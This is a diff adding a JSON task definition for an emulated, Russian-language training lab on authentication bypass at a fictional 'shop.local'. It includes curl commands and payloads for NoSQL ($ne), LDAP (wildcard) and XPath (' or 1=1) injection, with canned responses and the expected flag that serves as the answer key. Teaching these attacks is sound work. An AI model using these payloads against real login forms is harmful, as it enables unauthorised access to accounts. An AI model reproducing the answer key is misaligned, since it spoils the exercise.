@@ -1,0 +1,24 @@
+{
+  "id": "web-nosql-ldap-xpath",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{n0sql_0p3r4t0r_byp4ss_4dm1n}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: NoSQL / LDAP / XPath-инъекции\n\nТри формы входа на `shop.local`: `/api/login` (MongoDB, JSON), `/staff/login`\n(LDAP) и `/legacy/login` (XPath). Обойди аутентификацию на каждой.\n\nВажно: payload с `$` движок вырезает из аргументов, поэтому NoSQL-тело лежит\nв файле `bypass.json` и передаётся через `--data-binary @`.\n\n1. Обычный вход — пароль не подходит:\n\n   curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"secret\"}'\n\n2. NoSQL: подставь оператор $ne вместо строки (из файла):\n\n   curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' --data-binary @bypass.json > found.txt\n\n3. LDAP: звёздочка ломает фильтр:\n\n   curl -s -X POST https://shop.local/staff/login -d 'user=*&password=*'\n\n4. XPath: кавычка и or 1=1 делают условие истинным:\n\n   curl -s -X POST https://shop.local/legacy/login --data-urlencode \"user=' or 1=1 or ''='\" -d 'password=x'\n\n5. Набери `check` (флаг пришёл из шага 2).\n" },
+    { "path": "/home/student/task/bypass.json", "text": "{\"username\":\"admin\",\"password\":{\"$ne\":\"x\"}}\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        { "match": "bypass\\.json|\\$ne|%24ne", "example": "-s -X POST https://shop.local/api/login -H 'Content-Type: application/json' --data-binary @bypass.json", "output": "{\"ok\":true,\"role\":\"admin\",\"panel\":\"nto{n0sql_0p3r4t0r_byp4ss_4dm1n}\"}\n" },
+        { "match": "\\$regex|regex", "example": "-s -X POST https://shop.local/api/login -H 'Content-Type: application/json' --data-binary @bypass.json", "output": "{\"ok\":true,\"token\":\"eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjF9.7fQ\"}\n" },
+        { "match": "staff/login", "example": "-s -X POST https://shop.local/staff/login -d 'user=*&password=*'", "output": "Welcome, cn=admin,ou=staff,dc=shop,dc=local\n" },
+        { "match": "legacy/login", "example": "-s -X POST https://shop.local/legacy/login --data-urlencode \"user=' or 1=1 or ''='\" -d 'password=x'", "output": "<h1>Welcome, admin</h1>\n" },
+        { "match": "api/login", "example": "-s -X POST https://shop.local/api/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"secret\"}'", "output": "{\"error\":\"invalid credentials\"}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируются три формы входа на shop.local.\n"
+    }
+  }
+}
